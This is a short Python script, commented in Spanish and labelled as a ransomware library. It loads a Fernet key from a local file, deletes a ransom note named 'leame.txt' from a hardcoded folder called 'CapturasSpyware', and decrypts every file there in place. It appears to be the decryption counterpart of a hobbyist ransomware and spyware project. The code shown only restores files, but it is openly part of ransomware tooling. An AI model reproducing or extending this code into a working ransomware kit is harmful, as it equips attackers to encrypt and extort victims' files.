import os

'''Nota: libreria para Ransomware'''
from cryptography.fernet import Fernet


def GenerarLlave():
    llave = Fernet.generate_key()
    with open("llave.key", "wb") as archivo_llave:
        archivo_llave.write(llave)

def RetornarLlave():
    return open("llave.key", "rb").read()

def Desencriptar(imagenes, llave):
    i = Fernet(llave)
    for x in imagenes:
        with open(x, "rb") as file:
            datos_archivos = file.read()
        datos = i.decrypt(datos_archivos)

        with open(x, "wb") as file:
            file.write(datos)

if __name__ == "__main__":
    

    carpeta = 'C:\\Users\\Equipo\\AppData\\Local\\Programs\\Python\\Python38\\CapturasSpyware'
    os.remove(carpeta+"\\"+"leame.txt")
    imagenes = os.listdir(carpeta)
    carpeta_2 = [carpeta+"\\"+x for x in imagenes]


llave = RetornarLlave()

Desencriptar(carpeta_2, llave)
